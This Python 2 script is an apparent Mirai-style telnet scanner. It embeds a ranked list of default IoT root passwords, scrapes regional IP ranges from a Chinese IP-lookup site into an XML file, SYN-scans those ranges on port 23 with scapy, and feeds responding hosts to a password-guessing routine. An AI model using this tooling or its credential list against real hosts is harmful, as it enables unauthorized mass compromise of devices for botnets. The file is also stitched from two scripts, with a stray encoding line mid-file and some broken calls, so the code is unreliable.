#!/usr/bin/python
#encoding:utf-8


import heapq
import copy
import time 
import datetime
import threading
from random import choice
import Queue
#import socket
#import json
import sys
from new_module import *
from scapy.all import *
from collections import deque

try:
    import xml.etree.cElementTree as ET
except ImportError:
    import xml.etree.ElementTree as ET

reload(sys)
sys.setdefaultencoding('utf-8')

class PriorityQueue:
    def __init__(self):
        self._queue = []
        self._index = 0

    def push(self,pair,priority):
        heapq.heappush(self._queue,(-priority,self._index,pair))
        self._index += 1

    def pop(self):
        return heapq.heappop(self._queue)[-1]

#this should be a dict
auth_table = [("user","password",10),("tech","tech",1),("root","Zte521",2),("root","xc3511",2),("root","vizxv",1),("admin","admin",1),("root","admin",1),("root","888888",1),("root","xmhdipc",1),("root","juantech",1),("root","123456",1),("root","54321",1),("support","support",1),("root","",1),("admin","password",1),("root","root",1),("root","root",1),("user","user",1),("admin","admin1234",1),("admin","smcadmin",1),("root","klv123",1),("root","klv1234",1),("root","hi3518",1),("root","jvbzd",1),("root","anko",1),("root","zlxx.",1),("root","system",1)]

auth_queue = PriorityQueue()
for item in auth_table:
    auth_queue.push(item[0:2],item[-1])
-*- coding:utf-8 -*-
import urllib
import urllib2
import re
import json
import chardet


import sys
reload(sys) 
sys.setdefaultencoding('gb18030') 
import xml.dom.minidom as Dom
#First, create an xml file
ip_addressname=[]#Create a list of names in the province
#Created is a list of ip addresses
ipurl=[]
storeip=[]
#-------------Query ip address--------
IpUrl ="http://ips.chacuo.net/"
user_agent='Mozilla/5.0 (Windows NT 6.1; WOW64)'
headers={'User-Agent':user_agent}
try:
      req=urllib2.Request(IpUrl,headers=headers)
      response=urllib2.urlopen(req)
      content=response.read().decode('utf-8')
      my_get=r'<ul class="list">(.*?)</ul>'
      myitem=re.findall(my_get,content,re.S|re.M)
      i=0
      m=0
      for line in myitem:
            my_re=r'<li>(.*?)</li>'
            myitem1=re.findall(my_re,line,re.S|re.M)
            for line1 in myitem1:
                  if "a" in line1:
                        my_re1=r'<a .*?>(.*?)</a>'
                        myitem2=re.findall(my_re1,line1,re.S|re.M)
                        
                        #Get the url in href
                        my_url=r"(?<=href=\").+?(?=\")|(?<=href=\').+?(?=\')"
                        myitem3=re.findall(my_url,line1,re.I|re.S|re.M)
                        b2=json.dumps(myitem2,encoding="utf-8",ensure_ascii=False) 
                        b1=json.dumps(myitem3,encoding="utf-8",ensure_ascii=False)
                        string=','.join(myitem2)#Convert the list to a string
                        stringURL=','.join(myitem3)#Convert the url in the list to a string
                        ip_addressname.append(string)
                        ipurl.append(stringURL)
                        
                        
                  #else:
                        #print line1
      ad=json.dumps(ip_addressname,encoding="utf-8",ensure_ascii=False)
      ul=json.dumps(ipurl,encoding="utf-8",ensure_ascii=False)
      print ad
      print (u"Choose an address input screen from the addresses above".decode('gb18030'))
      while True:
            ip_address=raw_input("please input address:").decode('utf-8')
            #print chardet.detect(ip_address)['encoding']
            count=0
            for  i,inputname in enumerate(ip_addressname):
                  if ip_address==inputname:
                        req1=urllib2.Request(ipurl[count],headers=headers)
                        response1=urllib2.urlopen(req1)
                        content1=response1.read().decode('utf-8')
                        my_get1=r'<dd>(.*?)</dd>'
                        myitem4=re.findall(my_get1,content1,re.S|re.M)
                        for line2 in myitem4:
                              if "span" in line2:
                                    my_re2=r'<span .*?>(.*?)</span>'
                                    myitem5=re.findall(my_re2,line2,re.S|re.M)
                                    b=json.dumps(myitem5,encoding="utf-8",ensure_ascii=False)
                                    stringip='-'.join(myitem5)
                                    storeip.append(stringip)
                        n=0
                        length=len(storeip)
                        print  (u"The address you entered has %d IP address segments as shown below and saved in the ip.xml file".decode('gb18030') % length)
                        storeip1=','.join(storeip)
                        print storeip1
                        
                        if __name__ == "__main__":
                              doc = Dom.Document()
                              root_node = doc.createElement("ip")#Create an xml file named ip
                              doc.appendChild(root_node)
                              for i in range(0,length):            
                                    ip_author_node = doc.createElement("ip_range")
                                    for m in range(n,n+1):
                                          ip_author_value = doc.createTextNode(storeip[m])
                                          ip_author_node.appendChild(ip_author_value)  
                                    root_node.appendChild(ip_author_node)
                                    n+=1
                              f = open("ip.xml", "w")  
                              f.write(doc.toprettyxml(indent = "", newl = "\n", encoding = "utf-8"))  
                              f.close()
                  else:
                       count +=1
except urllib2.URLError,e:
      if hasattr(e,"code"):
            print e.code
      if hasattr(e,"reason"):
            print e.reason
            
 

lastRecv = time.time()
exitFlag = 0
queue = Queue.Queue()
queueLocker = threading.Lock()
ipLocker = threading.Lock()
ip_prompt_queue = deque(maxlen = 100)

def ip2num(ip,bigendian = True):
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3] & 0xffffffff

def num2ip(num,bigendian = True):
    return '%s.%s.%s.%s' % ((num >> 24) & 0xff , (num >> 16) & 0xff , (num >> 8) & 0xff , num & 0xff)

def read_ip(file_xml):
    ip_map = []

    tree = ET.ElementTree(file=file_xml)
    root = tree.getroot()
    ip_pair = [child.text.strip().split('-') for child in root]
    for x in ip_pair:
        ip_map.append(xrange(ip2num(x[0]),ip2num(x[1]) + 1))
#    return [num2ip(item) for pair in ip_map[0:10] for item in pair] 
    return ip_map

def choose_ip(ip_pair):
    if len(ip_pair) > 0:
        return choice(ip_pair)
    else:
        return None

def controlP():
    '''Init threads'''
    scanner_list = []
    start_time = datetime.now()
    spewer_thread = spewer("ip.xml")
    try:
       spewer_thread.start()
    except:
       print "[Error] Start spewer faild!"
       sys.exit()
             
    sniffer_thread = sniffer()
    try:
        sniffer_thread.daemon = True
        sniffer_thread.start()
    except:
       print "[Error] Start sniffer faild!"
       sys.exit()

    for i in range(int(sys.argv[1])):
        t = Scanner()
        try:
            t.start()
        except:
            pass
        scanner_list.append(t)

    while True:
        global exitFlag
        global lastRecv
        time.sleep(1)
        if time.time() - lastRecv > 30 and exitFlag == 1:
            exitFlag = 2
        elif exitFlag == 3:
            end_time = datetime.now()
            print "scanner mission completes..."
            print "It totally costs: %d seconds..." % (end_time - start_time).seconds
            break
    
    sys.exit(1)
            
def cook(pkt):
    try:
        global lastRecv
        lastRecv = time.time()
        if pkt[TCP].flags == 18 and pkt[IP].src not in ip_prompt_queue:
            queue.put(pkt[IP].src)
            print "23 port opened: %s " % (pkt[IP].src)
            #print pkt[IP].dst
            ip_prompt_queue.append(pkt[IP].src)
    except:
        pass

class sniffer(threading.Thread):
    '''receive sport=22 package'''
    def __init_(self):
        threading.Thread.__init__(self)

    def run(self):
        print "Start to sniffing..."
        sniff(filter="tcp and dst port 2222 and src port 23",prn=cook)


class spewer(threading.Thread):
    '''send dport=22 package'''
    def __init__(self,filename):
        threading.Thread.__init__(self)
        self.ip_pair = read_ip(filename)

    def run(self):
        global exitFlag
        print "Start to spewing..."
        pkt = IP()/TCP(sport=2222,dport=[23],flags="S")
        for pair in self.ip_pair:
            for ip in pair:
                pkt[IP].dst = num2ip(ip)
                try:
                    send(pkt,verbose=0)
                except:
                    pass
        exitFlag = 1

class Scanner(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        print "Starting scanner threading..."
        while True:
            ip_port = None
            queueLocker.acquire()
            global exitFlag
            if self.queue.empty() and exitFlag == 2 or exitFlag == 3:
                queueLocker.release()
                exitFlag = 3
                break
            elif self.queue.empty():
                queueLocker.release()
                time.sleep(3)
                continue
            try:
                ip_port = self.queue.get(block=False)
                #print "one IP gets\n"
            except:
                pass
            queueLocker.release()
            if ip_port: 
                #print "[scanner] Try to auth %s" % ip
                pass
            else:
                time.sleep(3)
                continue

            #password guessing
            con = Connection(copy.deepcopy(ip_port),copy.deepcopy(auth_queue))
            while con._state:
                con.run()
            con.exit()
            del con
                
if __name__ == "__main__": 
    if len(sys.argv) != 2:
        print "usage: scanner.py thread_number"
        print "example: scanner.py 20"
        sys.exit(1)
    controlP()
